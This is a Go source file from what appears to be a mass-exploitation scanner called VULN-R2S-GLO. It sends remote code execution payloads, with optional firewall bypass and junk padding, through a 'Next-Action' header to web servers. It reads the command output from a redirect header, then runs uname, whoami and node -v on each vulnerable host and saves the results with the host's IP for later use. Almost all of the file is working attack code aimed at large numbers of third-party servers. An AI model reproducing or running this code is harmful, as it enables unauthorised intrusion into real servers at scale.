package scanner

import (
	"VULN-R2S-GLO/payloads"
	"VULN-R2S-GLO/utils"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"time"
)

var (
	scannedCount    int64
	vulnerableCount int64
	lastSaved       int64 = 0
	stateFile             = "state/scan_state.json"
	vulnDir               = "output/vulnerable"
)

func init() {
	os.MkdirAll(vulnDir, 0755)
	os.MkdirAll("state", 0755)
}

func ExtractOutputFromHeaders(headers http.Header) string {
	redirect := headers.Get("X-Action-Redirect")
	if start := strings.Index(redirect, "/login?a="); start != -1 {
		end := strings.IndexAny(redirect[start:], ";&")
		if end == -1 {
			end = len(redirect[start:])
		}
		encoded := redirect[start+9 : start+9+end-9]
		if decoded, err := url.QueryUnescape(encoded); err == nil {
			return decoded
		}
	}
	return ""
}

func ExploitTarget(url, ip string, wafBypass bool, junkKB int) bool {
	body, ctype := payloads.BuildRCEPayload("id", wafBypass, junkKB)
	req, _ := http.NewRequest("POST", url, bytes.NewBufferString(body))
	req.Header.Set("Next-Action", "x")
	req.Header.Set("Content-Type", ctype)
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")

	resp, err := httpClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	output := ExtractOutputFromHeaders(resp.Header)
	if output == "" {
		return false
	}

	// Gather minimal server info
	serverInfo := map[string]string{}
	for _, cmdInfo := range [][2]string{
		{"OS", "uname -a"},
		{"User", "whoami"},
		{"Node", "node -v"},
	} {
		name, cmd := cmdInfo[0], cmdInfo[1]
		b2, c2 := payloads.BuildRCEPayload(cmd, wafBypass, junkKB)
		r2, _ := http.NewRequest("POST", url, bytes.NewBufferString(b2))
		r2.Header.Set("Next-Action", "x")
		r2.Header.Set("Content-Type", c2)
		r2.Header.Set("User-Agent", "Mozilla/5.0")
		r2Resp, _ := httpClient.Do(r2)
		if r2Resp != nil {
			r2Resp.Body.Close()
			serverInfo[name] = ExtractOutputFromHeaders(r2Resp.Header)
		}
	}

	result := map[string]interface{}{
		"url":           url,
		"ip":            ip,
		"output_sample": output,
		"server_info":   serverInfo,
		"scanner":       "VULN-R2S-GLO by @vulnquest58",
		"timestamp":     time.Now().Format(time.RFC3339),
	}

	// Save
	data, _ := json.MarshalIndent(result, "", "  ")
	fileName := filepath.Join(vulnDir, fmt.Sprintf("r2s_%s_%d.json", ip, time.Now().Unix()))
	os.WriteFile(fileName, data, 0644)

	atomic.AddInt64(&vulnerableCount, 1)
	utils.LogVuln(fmt.Sprintf("[R2S] VULNERABLE â†’ %s | ID: %.60s...", url, output))
	return true
}

func GetScanned() int64    { return atomic.LoadInt64(&scannedCount) }
func GetVulnerable() int64 { return atomic.LoadInt64(&vulnerableCount) }

func IncScanned() int64 {
	val := atomic.AddInt64(&scannedCount, 1)
	if val-lastSaved >= 1000 {
		SaveState()
		atomic.StoreInt64(&lastSaved, val)
	}
	return val
}

func SaveState() {
	state := map[string]interface{}{
		"scanned":    GetScanned(),
		"vulnerable": GetVulnerable(),
		"updated_at": time.Now().Format(time.RFC3339),
	}
	data, _ := json.MarshalIndent(state, "", "  ")
	os.WriteFile(stateFile, data, 0644)
}
